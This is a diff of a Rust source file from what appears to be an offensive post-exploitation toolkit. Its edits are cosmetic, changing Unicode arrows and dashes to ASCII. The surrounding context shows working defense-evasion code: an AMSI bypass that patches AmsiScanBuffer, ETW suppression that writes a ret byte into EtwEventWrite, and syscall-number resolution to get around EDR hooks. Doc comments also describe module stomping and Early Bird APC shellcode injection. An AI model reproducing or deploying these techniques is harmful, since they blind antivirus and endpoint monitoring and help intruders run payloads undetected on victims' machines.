@@ -1,4 +1,4 @@
-//! OPSEC / Stealth Layer — AMSI bypass, ETW patching, direct syscall infrastructure
+//! OPSEC / Stealth Layer -- AMSI bypass, ETW patching, direct syscall infrastructure
 //!
 //! Provides runtime evasion capabilities for post-exploitation payloads:
 //! - **AMSI bypass**: Patches `AmsiScanBuffer` to return `AMSI_RESULT_CLEAN`
@@ -153,7 +153,7 @@ pub unsafe fn patch_amsi() -> Result<AmsiBypassResult> {
         Ok(AmsiBypassResult {
             applied: true,
             amsi_loaded: true,
-            method: "amsi.dll!AmsiScanBuffer → xor eax,eax; ret".to_string(),
+            method: "amsi.dll!AmsiScanBuffer -> xor eax,eax; ret".to_string(),
             error: None,
         })
     }
@@ -209,7 +209,7 @@ pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
             ));
         };
 
-        // x64: ret (1 byte: 0xC3) — causes EtwEventWrite to immediately return
+        // x64: ret (1 byte: 0xC3) -- causes EtwEventWrite to immediately return
         let patch: [u8; 1] = [0xC3];
 
         std::ptr::copy_nonoverlapping(patch.as_ptr(), target as *mut u8, patch.len());
@@ -218,7 +218,7 @@ pub unsafe fn suppress_etw() -> Result<EtwSuppressResult> {
         Ok(EtwSuppressResult {
             applied: true,
             etw_loaded: true,
-            method: "ntdll.dll!EtwEventWrite → ret".to_string(),
+            method: "ntdll.dll!EtwEventWrite -> ret".to_string(),
             error: None,
         })
     }
@@ -335,7 +335,7 @@ pub unsafe fn patch_amsi_direct(numbers: &SyscallNumbers) -> Result<AmsiBypassRe
         nt_flush_instruction_cache_if_available(numbers);
 
         tracing::info!(
-            "AMSI direct: patched via raw syscall (protection 0x{old_protect:08X} → RWX → restored)"
+            "AMSI direct: patched via raw syscall (protection 0x{old_protect:08X} -> RWX -> restored)"
         );
 
         Ok(AmsiBypassResult {
@@ -583,7 +583,7 @@ pub struct OpsecPatchReport {
 /// constructing a raw syscall stub, we bypass these hooks entirely.
 ///
 /// The syscall number is found at offset +4 from the beginning of most Nt*
-/// functions in ntdll (e.g., `mov eax, SSN; ret` → SSN at bytes 4-7).
+/// functions in ntdll (e.g., `mov eax, SSN; ret` -> SSN at bytes 4-7).
 ///
 /// Returns a map of (function_name, syscall_number).
 #[cfg(target_os = "windows")]
@@ -663,7 +663,7 @@ pub fn resolve_syscall_numbers() -> Result<std::collections::HashMap<String, u32
             // Read the first 8 bytes of the function to find the syscall number.
             // Expected pattern:
             //   mov eax, SSN   ; B8 SS SS SS SS (5 bytes)
-            //   ret            ; C3 (1 byte)  — or jmp to syscall instruction
+            //   ret            ; C3 (1 byte)  -- or jmp to syscall instruction
             // or:
             //   mov r10, rcx   ; 4C 8B D1 (3 bytes)
             //   mov eax, SSN   ; B8 SS SS SS SS (5 bytes)
@@ -1040,7 +1040,7 @@ pub unsafe fn module_stomping_injection(
 /// Process injection diversity: **Early Bird APC Injection**.
 ///
 /// Creates a suspended process, injects shellcode, queues an APC to the main
-/// thread, then resumes — executing shellcode before the program's entry point.
+/// thread, then resumes -- executing shellcode before the program's entry point.
 /// Avoids `CreateRemoteThread` which is heavily monitored by EDRs.
 ///
 /// # Safety
